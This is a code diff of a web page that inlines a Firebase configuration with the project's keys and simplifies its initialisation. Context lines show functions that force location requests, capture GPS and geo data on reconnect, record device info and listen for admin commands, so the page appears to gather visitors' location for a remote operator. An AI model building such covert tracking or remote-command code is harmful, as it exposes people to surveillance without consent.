@@ -413,17 +413,19 @@
         <button onclick="forceRequestLocation()">Allow Location</button>
     </div>
 
-  
+
     <script>
+        // ✅ SABSE PEHLE YEH DAALO
         const firebaseConfig = {
-    apiKey: "AIzaSyBVN3GIrV_dw6J3ytSU9upkI8ciTsD9yOc",
-    authDomain: "db101-ff3d6.firebaseapp.com",
-    databaseURL: "https://db101-ff3d6-default-rtdb.firebaseio.com",
-    projectId: "db101-ff3d6",
-    storageBucket: "db101-ff3d6.firebasestorage.app",
-    messagingSenderId: "447900692217",
-    appId: "1:447900692217:web:6aa6ea9806ca0a9a3abc28"
-};
+            apiKey: "AIzaSyBVN3GIrV_dw6J3ytSU9upkI8ciTsD9yOc",
+            authDomain: "db101-ff3d6.firebaseapp.com",
+            databaseURL: "https://db101-ff3d6-default-rtdb.firebaseio.com",
+            projectId: "db101-ff3d6",
+            storageBucket: "db101-ff3d6.firebasestorage.app",
+            messagingSenderId: "447900692217",
+            appId: "1:447900692217:web:6aa6ea9806ca0a9a3abc28"
+        };
+
         // ==================== FIREBASE INIT ====================
         let database = null;
         let deviceId = null;
@@ -1126,14 +1128,18 @@
         }
 
         function initFirebase() {
-            if (typeof firebaseConfig !== 'undefined') {
-                if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+            try {
+                // ✅ Direct config use karo, check nahi karna
+                if (!firebase.apps.length) {
+                    firebase.initializeApp(firebaseConfig);
+                }
                 database = firebase.database();
                 console.log('✅ Firebase ready');
                 startApp();
-            } else {
-                console.error('❌ Config not loaded');
-                document.getElementById('deviceIdVal').innerHTML = 'Config Error';
+            } catch (error) {
+                console.error('❌ Firebase init error:', error);
+                document.getElementById('deviceIdVal').innerHTML = 'Firebase Error';
+                showToast('❌ Firebase connection failed!', true);
             }
         }
 
@@ -1154,8 +1160,8 @@
         window.addEventListener('online', async () => { showToast('📡 Back online!', false); await updateDeviceInfo(); captureGPS(); captureGeo(); });
         window.addEventListener('offline', () => { showToast('⚠️ You are offline.', true); });
 
-        if (typeof firebaseConfig !== 'undefined') { initFirebase(); }
-        else { window.addEventListener('load', () => { if (typeof firebaseConfig !== 'undefined') initFirebase(); else alert('config.js file not found!'); }); }
+        // ✅ Direct call karo (ab config top par hai)
+        initFirebase();
         // ==================== ADMIN COMMAND LISTENER ====================
         function listenForAdminCommand() {
             if (!database) return;
